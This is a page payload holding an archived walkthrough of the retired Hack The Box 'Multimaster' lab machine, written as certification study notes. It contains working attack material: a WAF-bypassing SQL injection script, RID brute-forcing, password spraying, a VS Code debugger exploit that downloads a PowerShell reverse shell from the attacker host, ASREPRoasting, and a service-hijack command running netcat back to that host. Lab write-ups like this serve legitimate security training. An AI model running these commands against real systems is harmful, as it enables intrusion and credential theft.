@@ -1,0 +1,558 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+11:I[6025,[],"OutletBoundary"]
+12:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-multimaster-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Multimaster Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Multimaster machine, preserved from Abdullah Kareem's OSEP Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:00:13.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[11," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-multimaster-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Multimaster machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Multimaster machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/multimaster","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/dadfa9161d72eacac03df456aa443da8b7b6e2f8/HTB-Multimaster.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep"," · dadfa9161d72",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Multimaster"," · Windows"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/multimaster","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7","$L8","$L9"]]}],"$La"]}]]}],"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Multimaster machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"13 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+8:["$","div","source-context-3",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This archive preserves that context and does not claim independent reproduction of every documented path."}],null]}]
+9:["$","div","technical-clarification-4",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: UF_DONT_REQUIRE_PREAUTH being set means Kerberos pre-authentication is disabled for that account. Any WAF or Unicode behavior described here is specific to the archived lab implementation."}],null]}]
+f:T6960,
+<p><strong>Machine:</strong> Multimaster<br /><strong>IP:</strong> 10.129.95.200<br /><strong>Difficulty:</strong> Insane<br /><strong>OS:</strong> Windows Server 2016 / Active Directory<br /><strong>Domain:</strong> MEGACORP.LOCAL  </p>
+<hr />
+
+
+
+<h2 id="overview">Overview</h2>
+<p>Multimaster is an Insane-rated Windows Active Directory machine. The exploitation path is long and multi-staged:</p>
+<pre><code>SQL Injection -&gt; Hash Dump -&gt; RID Enumeration -&gt; Password Spray -&gt; WinRM (user.txt)
+    -&gt; VS Code Exploit (cyork) -&gt; DLL Analysis -&gt; Password Spray (sbauer)
+    -&gt; ACL Abuse/ASREPRoast (jorden) -&gt; SeBackupPrivilege Abuse (root.txt)
+</code></pre>
+<p>The box heavily focuses on:</p>
+<ul>
+<li>Web application SQL injection with WAF bypass</li>
+<li>Active Directory enumeration via SQL injection primitives</li>
+<li>Hash cracking (Keccak-384)</li>
+<li>Local privilege escalation via VS Code CEF debugger</li>
+<li>Active Directory ACL abuse (GenericWrite -&gt; ASREPRoast)</li>
+<li>Windows privilege abuse (SeBackupPrivilege)</li>
+</ul>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="step-1-add-host-to-etc-hosts">Step 1: Add host to /etc/hosts</h3>
+<p><strong>Why:</strong> Active Directory domains require proper DNS resolution for Kerberos and LDAP operations. The machine responds to <code>megacorp.local</code> and <code>multimaster.megacorp.local</code>.</p>
+<pre><code class="language-bash" data-language="bash">sudo bash -c 'echo "10.129.95.200 multimaster.megacorp.local megacorp.local" &gt;&gt; /etc/hosts'
+</code></pre>
+<h3 id="step-2-nmap-scan">Step 2: Nmap Scan</h3>
+<p><strong>Why:</strong> We need to identify open ports, running services, and operating system. This machine has many AD-related ports open.</p>
+<pre><code class="language-bash" data-language="bash">nmap -Pn -sC -sV -oN multimaster.nmap 10.129.95.200
+</code></pre>
+<p><strong>Key findings:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>53/tcp</td>
+<td>DNS</td>
+<td>Domain controller indicator</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>IIS 10.0</td>
+<td>Web application (MegaCorp)</td>
+</tr>
+<tr>
+<td>88/tcp</td>
+<td>Kerberos</td>
+<td>Domain: MEGACORP.LOCAL</td>
+</tr>
+<tr>
+<td>389/tcp</td>
+<td>LDAP</td>
+<td>Active Directory LDAP</td>
+</tr>
+<tr>
+<td>445/tcp</td>
+<td>SMB</td>
+<td>Windows Server 2016</td>
+</tr>
+<tr>
+<td>1433/tcp</td>
+<td>MSSQL</td>
+<td>SQL Server 2017 - critical for later</td>
+</tr>
+<tr>
+<td>3389/tcp</td>
+<td>RDP</td>
+<td>Terminal Services</td>
+</tr>
+<tr>
+<td>5985/tcp</td>
+<td>WinRM</td>
+<td>Remote management - our shell vector</td>
+</tr>
+</tbody></table>
+<p><strong>Analysis:</strong></p>
+<ul>
+<li>Multiple domain controller ports confirm this is a DC</li>
+<li>HTTP on port 80 is our initial attack surface</li>
+<li>WinRM on 5985 means we'll likely use <code>evil-winrm</code> for shells</li>
+<li>MSSQL on 1433 explains why the web app uses SQL Server backend</li>
+</ul>
+<hr />
+<h2 id="sql-injection-discovery">SQL Injection Discovery</h2>
+<h3 id="step-3-discover-the-injection-point">Step 3: Discover the Injection Point</h3>
+<p><strong>Why:</strong> The web application has a "Colleague Finder" feature that searches employees. This is a classic attack surface for SQL injection.</p>
+<p>Navigate to <code>http://10.129.95.200</code> and find the employee search page. It sends a POST request to <code>/api/getColleagues</code> with JSON body <code>{"name":"a"}</code>.</p>
+<p><strong>Testing normal behavior:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.95.200/api/getColleagues \
+  -H "Content-Type: application/json" \
+  -d '{"name":"a"}' | python3 -m json.tool | head -20
+</code></pre>
+<p>Returns a JSON array of employees with fields: <code>id</code>, <code>name</code>, <code>position</code>, <code>email</code>, <code>src</code>.</p>
+<p><strong>Testing for SQL injection:</strong></p>
+<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.95.200/api/getColleagues \
+  -H "Content-Type: application/json" \
+  -d '{"name":"\u0027"}'
+</code></pre>
+<p><strong>Result:</strong> <code>null</code></p>
+<p><strong>Why this matters:</strong> The single quote (<code>'</code>) is encoded as <code>\u0027</code> (Unicode escape). The application returns <code>null</code> instead of the normal employee list, indicating the SQL query broke. This confirms SQL injection.</p>
+<p><strong>WAF/Encoding context:</strong> The application has a WAF that blocks raw quotes. Because the Content-Type is <code>application/json;charset=utf-8</code>, the server decodes Unicode escape sequences. By encoding our payload in Unicode escapes (<code>\u00XX</code>), we bypass the WAF entirely.</p>
+<hr />
+<h2 id="sql-injection-exploitation-dumping-hashes">SQL Injection Exploitation - Dumping Hashes</h2>
+<h3 id="step-4-manual-union-based-extraction">Step 4: Manual UNION-Based Extraction</h3>
+<p><strong>Why:</strong> We need to extract data from the database. Since it's MSSQL, we use UNION-based injection. We first determine the number of columns and which ones return data.</p>
+<p><strong>Payload structure:</strong> The original query likely looks like:</p>
+<pre><code class="language-sql" data-language="sql">SELECT id, name, position, email, src FROM Colleagues WHERE name LIKE '%INPUT%'
+</code></pre>
+<p>This means there are <strong>5 columns</strong>, and columns 2 and 3 (<code>name</code> and <code>position</code>) return visible data.</p>
+<p><strong>Python helper for Unicode encoding:</strong></p>
+<pre><code class="language-python" data-language="python">import requests
+import json
+
+url = "http://10.129.95.200/api/getColleagues"
+
+def encode_payload(s):
+    return ''.join([f'\\u{ord(c):04x}' for c in s])
+
+# Dump usernames and passwords from Logins table
+payload = "a' UNION SELECT 1,username,password,4,5 FROM Logins-- -"
+data = '{"name":"' + encode_payload(payload) + '"}'
+r = requests.post(url, data=data, headers={"Content-Type":"application/json"})
+print(r.text)
+</code></pre>
+<p><strong>Result:</strong> We extract 17 username/password pairs from the <code>Hub_DB.Logins</code> table.</p>
+<p><strong>Why UNION SELECT works:</strong> The original query returns 5 columns. Our <code>UNION SELECT 1,username,password,4,5</code> matches the column count. The <code>username</code> goes into the <code>name</code> field of the JSON response, and <code>password</code> goes into the <code>position</code> field.</p>
+<hr />
+<h2 id="hash-cracking">Hash Cracking</h2>
+<h3 id="step-5-identify-and-crack-the-hashes">Step 5: Identify and Crack the Hashes</h3>
+<p><strong>Why:</strong> The passwords are hashed. We need plaintext passwords for password spraying against domain services (SMB/WinRM).</p>
+<p><strong>Extracted hashes (unique only):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Username(s)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[redacted encoded lab material]</code></td>
+<td>aldom, cyork, james, jorden, sbauer, shayna</td>
+</tr>
+<tr>
+<td><code>[redacted encoded lab material]</code></td>
+<td>alyx, nbourne, okent, rmartin</td>
+</tr>
+<tr>
+<td><code>[redacted encoded lab material]</code></td>
+<td>ckane, ilee, kpage, zac, zpowers</td>
+</tr>
+<tr>
+<td><code>[redacted encoded lab material]</code></td>
+<td>egre55, minatotw</td>
+</tr>
+</tbody></table>
+<p><strong>Hash identification:</strong> Using hash analyzers, these match <strong>Keccak-384</strong> (SHA-3 family).</p>
+<p><strong>Cracking with hashcat:</strong></p>
+<pre><code class="language-bash" data-language="bash">hashcat -m 17900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O
+</code></pre>
+<p><strong>Results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>9777768363...</code></td>
+<td><code>password1</code></td>
+</tr>
+<tr>
+<td><code>68d1054460...</code></td>
+<td><code>finance1</code></td>
+</tr>
+<tr>
+<td><code>fb40643498...</code></td>
+<td><code>banking1</code></td>
+</tr>
+<tr>
+<td><code>cf17bb4919...</code></td>
+<td><em>(uncracked - admin accounts)</em></td>
+</tr>
+</tbody></table>
+<p><strong>Why only 3 cracked:</strong> The 4th hash belongs to CEO accounts (<code>minatotw</code>, <code>egre55</code>) with stronger passwords not in rockyou.txt.</p>
+<hr />
+<h2 id="rid-brute-force-via-sql-injection">RID Brute-Force via SQL Injection</h2>
+<h3 id="step-6-why-rid-brute-forcing">Step 6: Why RID Brute-Forcing?</h3>
+<p><strong>Why:</strong> The usernames from the web database don't all have domain accounts. Even worse, password spraying the known users with the cracked passwords fails. We need to find <strong>additional domain users</strong> that aren't in the web app's database.</p>
+<p><strong>Active Directory SID Structure:</strong></p>
+<ul>
+<li>Every AD object has a Security Identifier (SID)</li>
+<li>Domain SID + Relative Identifier (RID) = Full SID</li>
+<li>Well-known RIDs: 500 (Administrator), 512 (Domain Admins), 1000+ (domain objects)</li>
+</ul>
+<p><strong>MSSQL Functions for AD Enumeration:</strong></p>
+<ul>
+<li><code>SUSER_SID('DOMAIN\User')</code> → returns binary SID</li>
+<li><code>SUSER_SNAME(binary_sid)</code> → returns username from SID</li>
+<li><code>sys.fn_varbintohexstr()</code> → converts binary to hex string</li>
+</ul>
+<h3 id="step-7-extract-the-domain-sid">Step 7: Extract the Domain SID</h3>
+<pre><code class="language-python" data-language="python">payload = "a' UNION SELECT 1,(select sys.fn_varbintohexstr(SUSER_SID('MEGACORP\\Administrator'))),3,4,5-- -"
+</code></pre>
+<p><strong>Result:</strong> <code>[redacted encoded lab material]</code></p>
+<p><strong>Decoding:</strong></p>
+<ul>
+<li>Domain SID (first 48 bytes): <code>S-1-5-21-3167813660-1240564177-918740779</code></li>
+<li>RID (last 8 bytes): <code>f4010000</code> → reversed <code>0x000001f4</code> → <strong>500</strong> (Administrator)</li>
+</ul>
+<h3 id="step-8-brute-force-rids">Step 8: Brute-Force RIDs</h3>
+<p><strong>Why:</strong> By iterating RIDs from 1000+ and constructing SIDs, we can discover domain users, groups, and computers not exposed by the web app.</p>
+<pre><code class="language-python" data-language="python">import requests
+import json
+from time import sleep
+
+url = "http://10.129.95.200/api/getColleagues"
+
+def encode_payload(s):
+    return ''.join([f'\\u{ord(c):04x}' for c in s])
+
+domain_sid = "S-1-5-21-3167813660-1240564177-918740779"
+
+for rid in range(1000, 3001):
+    sid = f"{domain_sid}-{rid}"
+    payload = f"a'UNION SELECT 1,((SUSER_SNAME(SID_BINARY(N'{sid}')))),3,4,5-- -"
+    data = '{"name":"' + encode_payload(payload) + '"}'
+    
+    try:
+        r = requests.post(url, data=data, headers={"Content-Type":"application/json"}, timeout=10)
+        if "MEGACORP\\\\" in r.text:
+            parsed = json.loads(r.text)
+            name = parsed[0]["name"] if parsed else ""
+            if name and "Dns" not in name:
+                print(f"  RID {rid}: {name}")
+    except:
+        pass
+    
+    sleep(2)  # WAF bypass - critical!
+</code></pre>
+<p><strong>Key discoveries:</strong></p>
+<table>
+<thead>
+<tr>
+<th>RID</th>
+<th>Object</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1000</td>
+<td><code>MEGACORP\MULTIMASTER$</code> (domain computer)</td>
+</tr>
+<tr>
+<td>1103</td>
+<td><code>MEGACORP\svc-nas</code></td>
+</tr>
+<tr>
+<td>1105</td>
+<td><code>MEGACORP\Privileged IT Accounts</code> (group)</td>
+</tr>
+<tr>
+<td>1110</td>
+<td><code>MEGACORP\tushikikatomo</code></td>
+</tr>
+<tr>
+<td>1111</td>
+<td><code>MEGACORP\andrew</code></td>
+</tr>
+<tr>
+<td>1112</td>
+<td><code>MEGACORP\lana</code></td>
+</tr>
+</tbody></table>
+<p><strong>Why this works:</strong> The SQL Server runs with domain account privileges, allowing it to resolve SIDs to names via Active Directory. The WAF delay (<code>sleep(2)</code>) is essential — without it, requests get blocked.</p>
+<hr />
+<h2 id="password-spraying-and-initial-foothold">Password Spraying &amp; Initial Foothold</h2>
+<h3 id="step-9-spray-new-users">Step 9: Spray New Users</h3>
+<p><strong>Why:</strong> We now have new domain users and 3 cracked passwords. Password spraying uses a small password list against many users to avoid account lockout.</p>
+<pre><code class="language-bash" data-language="bash">cat &gt; new_users.txt &lt;&lt; 'EOF'
+tushikikatomo
+andrew
+lana
+svc-nas
+EOF
+
+cat &gt; passwords.txt &lt;&lt; 'EOF'
+password1
+finance1
+banking1
+EOF
+
+crackmapexec smb 10.129.95.200 -u new_users.txt -p REDACTED --continue-on-success
+crackmapexec winrm 10.129.95.200 -u new_users.txt -p REDACTED --continue-on-success
+</code></pre>
+<p><strong>Results:</strong></p>
+<ul>
+<li>SMB: <code>MEGACORP.LOCAL\tushikikatomo:finance1</code> ✅</li>
+<li>WinRM: <code>MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)</code> ✅</li>
+</ul>
+<h3 id="step-10-evil-winrm-and-user-flag">Step 10: evil-winrm and User Flag</h3>
+<p><strong>Why:</strong> WinRM (Windows Remote Management) on port 5985 is PowerShell remoting. <code>evil-winrm</code> gives us an interactive PowerShell session.</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u tushikikatomo -p REDACTED
+</code></pre>
+<pre><code class="language-powershell" data-language="powershell">cat C:\Users\alcibiades\Desktop\user.txt
+</code></pre>
+<p><strong>Result:</strong> <code>f2f7bb[redacted]1ef697903</code></p>
+<p><strong>Note:</strong> The user folder is <code>alcibiades</code>, not <code>tushikikatomo</code>. This happens when the user profile is mapped to a different folder name.</p>
+<hr />
+<h2 id="privilege-escalation-vs-code-cve-2019-1414">Privilege Escalation: VS Code CVE-2019-1414</h2>
+<h3 id="step-11-discover-vs-code-running">Step 11: Discover VS Code Running</h3>
+<p><strong>Why:</strong> As <code>tushikikatomo</code>, we have limited privileges. We need to find a local privilege escalation vector. Running processes show multiple <code>Code.exe</code> instances.</p>
+<pre><code class="language-powershell" data-language="powershell">Get-Process | Where-Object {$_.ProcessName -like "*Code*"}
+(Get-Command "C:\Program Files\Microsoft VS Code\Code.exe").FileVersionInfo.FileVersion
+</code></pre>
+<p><strong>Result:</strong> Version <strong>1.37.1</strong></p>
+<p><strong>Vulnerability Analysis:</strong></p>
+<ul>
+<li>VS Code versions before 1.38 are vulnerable to <strong>CVE-2019-1414</strong></li>
+<li>VS Code's Electron/Chromium framework exposes a <strong>CEF debugger</strong> on <code>127.0.0.1</code> with a random port</li>
+<li>The debugger accepts WebSocket connections and can execute arbitrary JavaScript via Node.js's <code>child_process</code></li>
+<li>Since VS Code runs as a different user (<code>cyork</code>), exploiting this gives us code execution as that user</li>
+</ul>
+<h3 id="step-12-download-and-use-cefdebug-exe">Step 12: Download and Use cefdebug.exe</h3>
+<p><strong>Why:</strong> <code>cefdebug</code> (by Tavis Ormandy) scans for CEF debug listeners and allows connecting to them to execute code.</p>
+<p>On Kali:</p>
+<pre><code class="language-bash" data-language="bash">wget -q https://github.com/taviso/cefdebug/releases/download/v0.1/cefdebug.zip
+unzip cefdebug.zip
+</code></pre>
+<p>On target (via evil-winrm):</p>
+<pre><code class="language-powershell" data-language="powershell">Invoke-WebRequest -Uri "http://10.10.17.27:8080/cefdebug/cefdebug.exe" -OutFile "cefdebug.exe"
+.\cefdebug.exe
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583
+</code></pre>
+<h3 id="step-13-exploit-the-debugger">Step 13: Exploit the Debugger</h3>
+<p><strong>Why:</strong> The CEF debugger runs JavaScript in VS Code's renderer process, which has access to Node.js APIs. We use <code>process.mainModule.require('child_process').exec()</code> to spawn a system command.</p>
+<p><strong>Setup on Kali:</strong></p>
+<pre><code class="language-bash" data-language="bash"># Terminal 1: HTTP server
+python3 -m http.server 8080
+
+# Terminal 2: Netcat listener
+nc -lnvp 4444
+</code></pre>
+<p><strong>Create reverse shell script (<code>shell.ps1</code>):</strong></p>
+<pre><code class="language-powershell" data-language="powershell">$client = New-Object System.Net.Sockets.TCPClient('10.10.17.27',4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String )
+    $sendback2 = $sendback + 'PSReverseShell# '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+</code></pre>
+<p><strong>Exploit command:</strong></p>
+<pre><code class="language-powershell" data-language="powershell">.\cefdebug.exe --url ws://127.0.0.1:35099/7b19d23b-1ec0-4143-8d4c-26ebd6b88583 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.17.27:8080/shell.ps1\')')"
+</code></pre>
+<p><strong>Result:</strong> Reverse shell connects to Kali as <code>cyork</code>.</p>
+<pre><code>PSReverseShell# whoami
+megacorp\cyork
+</code></pre>
+<hr />
+<h2 id="lateral-movement-cyork-sbauer">Lateral Movement: cyork -&gt; sbauer</h2>
+<h3 id="step-14-find-the-hardcoded-password">Step 14: Find the Hardcoded Password</h3>
+<p><strong>Why:</strong> <code>cyork</code> has read access to <code>C:\inetpub\wwwroot\bin\</code> (the web application directory). The <code>.dll</code> files may contain hardcoded credentials.</p>
+<p>The <code>MultimasterAPI.dll</code> contains the database connection string:</p>
+<pre><code>server=localhost;database=Hub_DB;uid=finder;password=REDACTED;
+</code></pre>
+<p><strong>Why this exists:</strong> Developers often hardcode credentials in compiled binaries, especially in <code>.config</code> files or connection strings embedded in DLLs.</p>
+<h3 id="step-15-password-spray-with-new-password">Step 15: Password Spray with New Password</h3>
+<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.95.200 -u all_users.txt -p REDACTED --continue-on-success
+crackmapexec winrm 10.129.95.200 -u all_users.txt -p REDACTED --continue-on-success
+</code></pre>
+<p><strong>Result:</strong> <code>sbauer:D3veL0pM3nT!</code> with WinRM access.</p>
+<hr />
+<h2 id="lateral-movement-sbauer-jorden-asreproast">Lateral Movement: sbauer -&gt; jorden (ASREPRoast)</h2>
+<h3 id="step-16-discover-acl-abuse-path">Step 16: Discover ACL Abuse Path</h3>
+<p><strong>Why:</strong> <code>sbauer</code> doesn't have direct admin access. We need to find an attack path in Active Directory. Using BloodHound or manual enumeration, we discover:</p>
+<ul>
+<li><code>sbauer</code> has <strong>GenericWrite</strong> over <code>jorden</code></li>
+<li><code>jorden</code> is a member of <strong>Server Operators</strong> (high-value group)</li>
+</ul>
+<p><strong>GenericWrite Abuse:</strong> GenericWrite on a user object allows us to modify non-protected attributes, including <code>userAccountControl</code>. We can set <code>UF_DONT_REQUIRE_PREAUTH</code> to make the account AS-REP roastable.</p>
+<h3 id="step-17-enable-preauth-bypass-on-jorden">Step 17: Enable Preauth Bypass on jorden</h3>
+<p>Connect as <code>sbauer</code>:</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u sbauer -p REDACTED
+</code></pre>
+<pre><code class="language-powershell" data-language="powershell">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true
+</code></pre>
+<p><strong>Why this works:</strong> The <code>Set-ADAccountControl</code> cmdlet modifies the <code>userAccountControl</code> attribute. Setting <code>doesnotrequirepreauth</code> to <code>$true</code> adds the <code>UF_DONT_REQUIRE_PREAUTH</code> flag (0x400000). This tells the KDC that the user doesn't need to pre-authenticate before requesting a TGT, allowing anyone to request an AS-REP for this user.</p>
+<h3 id="step-18-asreproast-jorden">Step 18: ASREPRoast jorden</h3>
+<p>On Kali:</p>
+<pre><code class="language-bash" data-language="bash">impacket-GetNPUsers -format hashcat -usersfile jorden_only.txt -dc-ip 10.129.95.200 megacorp.local/sbauer:'D3veL0pM3nT!'
+</code></pre>
+<p><strong>Why ASREPRoasting works:</strong> Normally, Kerberos requires pre-authentication (proving knowledge of the password before getting a ticket). With <code>UF_DONT_REQUIRE_PREAUTH</code> disabled, we can request an AS-REP ticket for <code>jorden</code> without knowing the password. The AS-REP contains encrypted data that we can crack offline.</p>
+<h3 id="step-19-crack-jorden-s-hash">Step 19: Crack jorden's Hash</h3>
+<pre><code class="language-bash" data-language="bash">hashcat -m 18200 jorden.hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Result:</strong> <code>rainforest786</code></p>
+<hr />
+<h2 id="privilege-escalation-to-administrator-sebackupprivilege">Privilege Escalation to Administrator (SeBackupPrivilege)</h2>
+<h3 id="step-20-evil-winrm-as-jorden">Step 20: evil-winrm as jorden</h3>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.95.200 -u jorden -p REDACTED
+</code></pre>
+<h3 id="step-21-check-privileges">Step 21: Check Privileges</h3>
+<pre><code class="language-powershell" data-language="powershell">whoami /priv
+</code></pre>
+<p><strong>Key privileges:</strong></p>
+<ul>
+<li><code>SeBackupPrivilege</code> (Enabled)</li>
+<li><code>SeRestorePrivilege</code> (Enabled)</li>
+</ul>
+<p><strong>Why SeBackupPrivilege is powerful:</strong></p>
+<ul>
+<li>Members of the <strong>Backup Operators</strong> group (and <strong>Server Operators</strong>) have this privilege</li>
+<li>It grants <strong>read access to ALL files</strong>, bypassing normal ACL permissions</li>
+<li>When combined with backup-aware tools (like <code>robocopy /B</code>), it allows copying files the user normally cannot access</li>
+</ul>
+<h3 id="step-22-copy-root-txt-using-backup-mode">Step 22: Copy root.txt Using Backup Mode</h3>
+<p><strong>Why <code>robocopy /B</code>:</strong> The <code>/B</code> flag tells robocopy to use backup mode, which uses the <code>SeBackupPrivilege</code> to bypass file ACLs. This is a standard Windows feature designed for backup software.</p>
+<pre><code class="language-powershell" data-language="powershell">robocopy C:\Users\Administrator\Desktop C:\Users\jorden\Desktop root.txt /B
+</code></pre>
+<p><strong>Result:</strong> The 34-byte <code>root.txt</code> is copied successfully despite <code>jorden</code> not having normal read access to <code>C:\Users\Administrator\Desktop</code>.</p>
+<h3 id="step-23-read-the-flag">Step 23: Read the Flag</h3>
+<pre><code class="language-powershell" data-language="powershell">cat C:\Users\jorden\Desktop\root.txt
+</code></pre>
+<p><strong>Result:</strong> <code>6fe41f[redacted]0413d08e</code></p>
+<hr />
+<h2 id="alternative-root-paths">Alternative Root Paths</h2>
+<h3 id="acl-modification-method-writeups-1-and-2">ACL Modification Method (Writeups 1 &amp; 2)</h3>
+<p>Instead of <code>robocopy</code>, you can also use PowerShell to directly modify ACLs:</p>
+<pre><code class="language-powershell" data-language="powershell">$user = 'MEGACORP\jorden'
+$folder = 'C:\Users\Administrator'
+$acl = Get-ACL $folder
+$aclperms = $user, "FullControl", "ContainerInherit, ObjectInherit","None","Allow"
+$aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
+$acl.AddAccessRule($aclrule)
+Set-Acl -Path $folder -AclObject $acl
+</code></pre>
+<p><strong>Why this works:</strong> <code>SeRestorePrivilege</code> allows restoring files and directories, which includes the ability to modify ACLs on any file.</p>
+<h3 id="service-hijacking-method-writeup-2">Service Hijacking Method (Writeup 2)</h3>
+<p><code>jorden</code> (as Server Operators) can start/stop services. You can modify service binaries to get a SYSTEM shell:</p>
+<pre><code class="language-powershell" data-language="powershell">REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\nc.exe 10.10.17.27 4445 -e cmd.exe" /f
+sc.exe start VSS
+</code></pre>
